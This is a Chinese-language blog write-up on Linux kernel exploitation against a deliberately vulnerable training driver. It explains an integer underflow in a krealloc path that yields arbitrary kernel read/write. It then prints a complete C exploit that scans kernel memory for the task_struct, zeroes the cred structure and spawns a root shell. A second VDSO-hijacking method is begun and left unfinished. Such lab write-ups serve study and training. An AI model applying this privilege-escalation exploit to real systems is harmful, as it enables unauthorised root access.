---
layout: post
title: 任意读写漏洞进行提权
excerpt: "kernel pwn"
categories: [未完待续]
comments: true
---

#### 功能介绍
ARBITRARY_RW_INIT
```
		case ARBITRARY_RW_INIT:
		{
			init_args i_args;//就是一个size_t类型的size
			int ret;

			if(copy_from_user(&i_args, p_arg, sizeof(init_args)))//将用户输入传入
				return -EINVAL;

			ret = arbitrary_rw_init(&i_args);
			break;
		}
```
其中init_args
```
	typedef struct init_args {
		size_t size;
	}init_args;
```
继续跟进函数如下
```
	static int arbitrary_rw_init(init_args *args)
	{
		if(args->size == 0 || g_mem_buffer != NULL)
			return -EINVAL;

		g_mem_buffer = kmalloc(sizeof(mem_buffer), GFP_KERNEL);

		if(g_mem_buffer == NULL)
			goto error_no_mem;

		g_mem_buffer->data = kmalloc(args->size, GFP_KERNEL);

		if(g_mem_buffer->data == NULL)
			goto error_no_mem_free;

		g_mem_buffer->data_size = args->size;
		g_mem_buffer->pos = 0;

		printk(KERN_INFO "[x] Allocated memory with size %lu [x]\n", g_mem_buffer->data_size);

		return 0;

		error_no_mem:
			return -ENOMEM;

		error_no_mem_free:
			kfree(g_mem_buffer);
			return -ENOMEM;
	}
```
上边代码的作用就是为mem_buffer开辟一块空间,然后其数据指向用户开辟的空间.

其中全局结构体,其中包含了数据的大小和指针
```
	typedef struct mem_buffer {
		size_t data_size;
		char *data;
		loff_t pos;
	}mem_buffer;
```
ARBITRARY_RW_REALLOC
```
		case ARBITRARY_RW_REALLOC:
		{
			realloc_args r_args;

			if(copy_from_user(&r_args, p_arg, sizeof(realloc_args)))
				return -EINVAL;

			ret = realloc_mem_buffer(&r_args);
			break;
		}
```
其中结构体
```
	typedef struct realloc_args {
		int grow;
		size_t size;
	}realloc_args;
```
跟进函数
```
	static int realloc_mem_buffer(realloc_args *args)
	{
		if(g_mem_buffer == NULL)
			return -EINVAL;

		size_t new_size;
		char *new_data;

		//We can overflow size here by making new_size = -1
		if(args->grow)
			new_size = g_mem_buffer->data_size + args->size;
		else
			new_size = g_mem_buffer->data_size - args->size;

		//new_size here will equal 0 krealloc(..., 0) = ZERO_SIZE_PTR
		new_data = krealloc(g_mem_buffer->data, new_size+1, GFP_KERNEL);

		//missing check for return value ZERO_SIZE_PTR
		if(new_data == NULL)
			return -ENOMEM;

		g_mem_buffer->data = new_data;
		g_mem_buffer->data_size = new_size;

		printk(KERN_INFO "[x] g_mem_buffer->data_size = %lu [x]\n", g_mem_buffer->data_size);

		return 0;
	}
```
漏洞：`realloc_mem_buffer()`中未检查传入变量`args->size`的正负，可以传入负数。如果通过传入负数，使得`new_size== -1`，由于`kmalloc(new_size+1)`，由于`kmalloc(0)`会返回`0x10`，这样`g_mem_buffer->data == 0x10`; `g_mem_buffer->data_size == 0xffffffffffffffff`，读写时只会检查是否满足`((count + pos) < g_mem_buffer->data_size)`条件，实现任意地址读写。

### 方法一：修改cred结构提权
思路：利用任意读找到cred结构体，再利用任意写，将用于表示权限的数据位写0，即可提权。

利用任意读找到结构体如下
```
//裁剪过后 
struct task_struct {
    volatile long state;    /* -1 unrunnable, 0 runnable, >0 stopped */
    void *stack;
    atomic_t usage;
    unsigned int flags; /* per process flags, defined below */
    unsigned int ptrace;
... ...

/* process credentials */
    const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */
    const struct cred __rcu *real_cred; /* objective and real subjective task
                     * credentials (COW) */
    const struct cred __rcu *cred;  /* effective (overridable) subjective task
                     * credentials (COW) */
    char comm[TASK_COMM_LEN]; /* executable name excluding path
                     - access with [gs]et_task_comm (which lock
                       it with task_lock())
                     - initialized normally by setup_new_exec */
/* file system info */
    struct nameidata *nameidata;
#ifdef CONFIG_SYSVIPC
/* ipc stuff */
    struct sysv_sem sysvsem;
    struct sysv_shm sysvshm;
#endif
... ... 
};
```
其中，cred结构体（\include\linux\cred.h 118）就表示该线程的权限。只要将结构体的uid~fsgid全部覆写为0即可提权该线程（root uid为0）。前28字节

思路：利用任意读找到cred结构体，再利用任意写，将用于表示权限的数据位写0，即可提权。

搜索cred结构体：task_struct里有个char comm[TASK_COMM_LEN];结构，这个结构可通过prctl函数中的PR_SET_NAME功能，设置为一个小于16字节的字符串。

方法：设定该值作为标记，利用任意读找到该字符串，即可找到task_structure，进而找到cred结构体，再利用任意写提权。

确定爆破范围：task_structure是通过调用kmem_cache_alloc_node()分配的，所以kmem_cache_alloc_node应该存在内核的动态分配区域。(\kernel\fork.c 140)。
```
static inline struct task_struct *alloc_task_struct_node(int node)
{
    return kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);
}
```
根据内存映射图，爆破范围应该在0xffff880000000000~0xffffc80000000000。

完整的代码
```
#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <sys/prctl.h>

#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM,0)
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"
#define START_ADDR 0xffff880000000000
#define END_ADDR 0xffffc80000000000

struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};

int read_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args2;
	struct read_args r_args;
	int ret;

	s_args2.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
	r_args.buff=buff;
	r_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
	return ret;
}
int write_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args1;
	struct write_args w_args;
	int ret;

	s_args1.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
	w_args.buff=buff;
	w_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
	return ret;
}

int main()
{
	int fd=-1;
	int result=0;
	struct init_args i_args;
	struct realloc_args rello_args;
	size_t real_cred=0;
	size_t cred=0;
	size_t target_addr;
	int root_cred[12];

	setvbuf(stdout, 0LL, 2, 0LL);
	char *buf=malloc(0x1000);
	char target[16];

	strcpy(target,"try2findmesauce");
	prctl(PR_SET_NAME,target);  //将特定字符串写入
	fd=open(PATH,O_RDWR);
	if (fd<0){
		puts("[-] open error ! \n");
		exit(-1);
	}
	//  爆破出 cred地址
	i_args.size=0x100;
	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
	rello_args.grow=0;
	rello_args.size=0x100+1;
	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
	puts("[+] We can read and write any memory! [+]");
	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)       //开始爆破
	{
		read_mem(fd,addr,buf,0x1000);
		result=memmem(buf,0x1000,target,16);//memmem是一个C库函数，用于在一块内存中寻找匹配另一块内存的内容的第一个位置
		if (result)
		{
			printf("[+] Find try2findmesauce at : %p\n",result);
			cred=*(size_t *)(result-0x8);
			real_cred=*(size_t *)(result-0x10);
			if ((cred || 0xff00000000000000) && (real_cred == cred))
			{
				target_addr=addr+result-(long int)(buf);
				printf("[+] found task_struct 0x%x\n",target_addr);
				printf("[+] found cred 0x%lx\n",real_cred);
				break;
			}
		}
	}
	if (result==0)
	{
		puts("[-] not found, try again! \n");
		exit(-1);
	}
	// 修改cred
	memset((char *)root_cred,0,28);
	write_mem(fd,cred,root_cred,28);

	if (getuid()==0)
	{
		printf("[+] Now you are r00t, enjoy your shell\n");
		system("/bin/sh");
	}
	else
	{
		puts("[-] There are something wrong!\n");
		exit(-1);
	}
	return 0;
}
```
### 方法二：劫持VDSO
VDSO是内核通过映射方法与用户态共享一块物理内存，从而加快执行效率，也叫影子内存。当在内核态修改内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，vdso和vsyscall。
```
gdb-peda$ cat /proc/self/maps
00400000-0040c000 r-xp 00000000 08:01 561868                             /bin/cat
0060b000-0060c000 r--p 0000b000 08:01 561868                             /bin/cat
0060c000-0060d000 rw-p 0000c000 08:01 561868                             /bin/cat
01cff000-01d20000 rw-p 00000000 00:00 0                                  [heap]
...
7fff937d7000-7fff937d9000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

